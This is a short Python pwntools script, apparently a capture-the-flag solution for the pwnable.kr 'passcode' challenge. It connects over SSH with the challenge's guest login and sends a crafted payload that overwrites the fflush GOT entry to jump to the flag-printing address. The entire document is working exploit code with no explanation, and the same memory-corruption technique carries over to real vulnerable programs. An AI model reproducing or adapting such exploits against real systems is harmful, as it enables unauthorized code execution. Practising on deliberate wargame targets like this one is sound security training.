#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

server = ["pwnable.kr", 2222, "passcode", "guest"]

connectionHandle = ssh(host=server[0], port=server[1], user=server[2], password=server[3])

processHandle = connectionHandle.process(executable="./passcode", argv=["./passcode"])

fflush_got_plt = 0x804a004
flag = 0x080485d7 

payload = "a"*96
payload += p32(fflush_got_plt)
payload += str(int(flag))

print(processHandle.recvline(1024, timeout=1.0))
processHandle.sendline(payload)
print(processHandle.recvall(timeout=1.0))
processHandle.close()
